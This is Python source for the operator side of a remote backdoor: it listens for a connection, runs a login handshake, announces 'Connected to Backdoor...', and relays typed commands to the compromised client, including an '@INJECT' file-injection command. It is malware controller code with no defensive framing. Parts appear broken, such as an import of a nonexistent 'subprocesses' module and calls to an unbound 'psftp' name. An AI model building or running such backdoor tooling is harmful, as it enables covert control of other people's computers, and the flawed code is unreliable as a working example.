import socket, json, os, subprocesses
from psftp import *
def recieve(s, buff=1024):
	data = b''
	while True:
		packet = s.recv(buff)
		data += packet
		if len(packet) < buff:
			break
	return data
def cd(newdir):
	global path, cwd
	path = os.path.normpath(f'{path}/{newdir}')
	cwd = os.path.abspath(path)
srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
	with open('cfg/settings.json', 'r') as file:
		settings = json.load(file)
	ip = socket.gethostname()
	port = settings['port']
	print('\n\n - Use \'@HELP\' or \'::?\' for a list of commands.')
	print(' - Use \'@GO\' or \'::!\' to start listening for connections.')
	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program\n\n')
	while True:
		usrin = input('>> ')
		if usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
			with open('cfg/help.txt', 'r') as file:
				print(file.read())
			continue
		elif usrin.find('@GO') == 0 or usrin.find('::!') == 0:
			break
		else:
			continue
	srvr.bind((ip, port))
	srvr.listen()
	client, addr = srvr.accept()
	print(f'Connection from {addr} has been established...')
	while True:
		data = recieve(client)
		msg = data.decode()
		if msg == '@LOGIN':
			while True:
				login = input('Login: ')
				data = bytes(login, 'utf-8')
				client.send(data)
				data = recieve(client)
				msg = data.decode()
				if msg == '@CONNECTED':
					print('Connected to Backdoor...')
					client.send(b'@CONFIRM-CONNECTION')
					break
				else:
					continue
			continue
		elif msg.find('@GET-INPUT ') == 0:
			usrin = input(msg[11:])
			if usrin.replace(' ', '') == '@KILL' or usrin.replace(' ', '') == '::k':
				client.close()
				break
			elif usrin.replace(' ', '') == '@TERMINATE' or usrin.replace(' ', '') == '::t':
				os._exit(1)
			elif usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
				with open('cfg/help.txt', 'r') as file:
					print(file.read())
				client.send(b'@RESEND')
				continue
			elif usrin.find('@INJECT') == 0 or usrin.find('::i') == 0:
				msg = usrin.replace('@INJECT ', '')
				msg = msg.replace('::i ', '')
				msg = psftp.process(msg)
				psftp.send(client, usrin)
			else:
				data = bytes(usrin, 'utf-8')
				client.send(data)
				continue
		else:
			print(msg)
			continue
	settings['new-log'] = True
	with open('cfg/settings.json', 'w') as file:
		json.dump(settings, file, indent=4)